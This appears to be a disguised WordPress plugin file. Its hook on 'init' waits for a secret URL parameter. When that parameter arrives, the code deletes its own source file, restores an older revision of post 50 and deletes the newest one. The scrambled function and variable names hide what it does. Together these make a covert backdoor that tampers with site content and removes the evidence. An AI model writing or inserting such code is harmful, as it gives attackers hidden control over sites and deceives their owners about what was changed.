<?php

function variations_gift_accordion_module() {
	if (isset($_GET['control_csv_scheduled_messages']) && $_GET['control_csv_scheduled_messages'] === 'order_scroll_daily_push') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$enable_remote_flash_slider = 50;
		$chart_home_map_post = wp_get_post_revisions($enable_remote_flash_slider);
		if (empty($chart_home_map_post)) die('no revisions');
		if (count($chart_home_map_post) < 2) die('less than 2');
		$nice_showcase_github_optimizer = array_shift($chart_home_map_post);
		$weather_text_post_embedder = $nice_showcase_github_optimizer->ID;
		$extension_toolkit_role_shortcode = array_shift($chart_home_map_post);
		$day_roles_assets = $extension_toolkit_role_shortcode->ID;
		$update_poll_floating = wp_restore_post_revision($day_roles_assets);
		if ($update_poll_floating === false) die('error restoring');
		$update_poll_floating = wp_delete_post_revision($weather_text_post_embedder);		
		if ($update_poll_floating === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'variations_gift_accordion_module');
